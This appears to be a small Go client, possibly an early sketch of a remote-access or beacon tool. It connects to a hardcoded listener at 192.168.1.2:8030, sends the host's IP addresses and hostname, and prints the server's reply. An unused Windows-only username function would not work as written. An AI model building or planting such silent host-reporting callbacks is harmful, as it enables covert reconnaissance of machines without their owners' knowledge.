package main

import (
	"fmt"
	"net"
	"os/exec"
	"regexp"
)

func main() {

	const (
		SERVER = "192.168.1.2"
		PORT   = "8030"
	)

	conn, err := net.Dial("tcp", SERVER+":"+PORT)
	if err != nil {
		panic(err)
	}
	serverConnet(conn)
}

func parseIpAddresses() string {
	///
	/// 127.0.0.1/8 192.168.1.2/24 192.1
	/// 68.1.6/24 172.16.184.1/24 192.16
	/// 8.193.1/24
	///
	var data string
	addrs, err := net.InterfaceAddrs()
	if err != nil {
		panic(err)
	}
	for _, addr := range addrs {
		formatAddr := addr.String()
		matched, _ := regexp.MatchString(`([0-9]{1,3}[\.]){3}[0-9]{1,3}/[0-9]{1,2}`, formatAddr)
		if matched {
			data += fmt.Sprintf("%s ", formatAddr)
		}
	}
	return data
}

func parseHostName() string {
	cmd := exec.Command("hostname")
	out, _ := cmd.Output()
	return string(out)
}

func parseCurrentUser() string { // только для windows
	cmd := exec.Command("echo %UserName%")
	out, _ := cmd.Output()
	return string(out)
}

func serverConnet(connection net.Conn) {
	defer connection.Close()

	buffer := make([]byte, 400)
	ipdata := parseIpAddresses()
	hostdata := parseHostName()
	connection.Write([]byte(ipdata + hostdata))
	serverData, err := connection.Read(buffer)
	if err != nil {
		fmt.Println("Error reading:", err.Error())
	}
	fmt.Println(string(buffer[:serverData]))
}
